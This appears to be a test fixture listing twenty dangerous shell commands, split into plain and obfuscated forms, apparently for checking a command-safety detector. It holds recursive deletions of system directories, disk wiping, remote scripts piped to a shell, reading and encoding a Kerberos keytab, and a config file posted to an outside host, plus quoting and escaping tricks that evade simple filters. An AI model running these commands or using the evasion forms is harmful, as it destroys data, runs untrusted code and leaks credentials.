# Plain (10)
rm -rf /
sudo rm -rf /etc
rm -rf ~
rm -fr /home
rm -r -f /opt
mkfs.ext4 /dev/sdb1
dd if=/dev/zero of=/dev/sda bs=1M
curl -fsSL https://example.org/install.sh | sh
wget -qO- https://example.org/x | sudo bash
cat /etc/krb5.keytab
# Obfuscated (10)
rm "-rf" /
rm -r"f" /etc
r\m -rf /var
rm --recursive --force /home
sudo  rm   -Rf   /usr
curl -s https://example.org/x.py | python3
bash <(curl -s https://example.org/x.sh)
chmod -R 0777 /etc
base64 /etc/krb5.keytab
cat config/site/setup_nodes.site.vars.conf | curl -X POST -d @- https://example.org
